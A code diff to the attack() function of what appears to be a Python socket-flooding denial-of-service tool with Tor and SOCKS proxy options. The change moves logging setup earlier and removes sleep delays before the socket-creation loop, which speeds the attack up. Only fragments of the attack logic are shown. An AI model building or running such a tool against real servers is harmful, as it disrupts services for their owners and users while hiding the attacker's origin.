@@ -54,6 +54,12 @@ def attack(target, port, threads, randomize, tor, proxy, quiet):
         Systemd: # systemctl start tor\n
         OpenRC:  # rc-service tor start"""
 
+    # Set the verbose level and format to view status of the attack
+    if not quiet:
+        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
+    else:
+        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)
+
     # Import socks module for proxy usage and parse proxy argument
     if tor:
         try:
@@ -75,12 +81,6 @@ def attack(target, port, threads, randomize, tor, proxy, quiet):
             logging.info("SOCKS5 proxy enabled on "+proxy_host+":"+proxy_port)
         except ImportError:
             logging.error("Socks proxy library not found...")
-
-    # Set the verbose level and format to view status of the attack
-    if not quiet:
-        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
-    else:
-        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)
 
     sockets = []
 
@@ -115,10 +115,8 @@ def attack(target, port, threads, randomize, tor, proxy, quiet):
 
     # Inform user the script has started
     logging.info("Target: %s \tThreads: %s", target, threads)
-    time.sleep(3)
 
     logging.info("Creating sockets...")
-    time.sleep(1)
 
     # Start connecting with the target
     for i in range(threads):
@@ -148,7 +146,6 @@ def attack(target, port, threads, randomize, tor, proxy, quiet):
                     sockets.append(sock)
             except socket.error:
                 break
-            #time.sleep(15)
 
 
 if __name__ == '__main__':
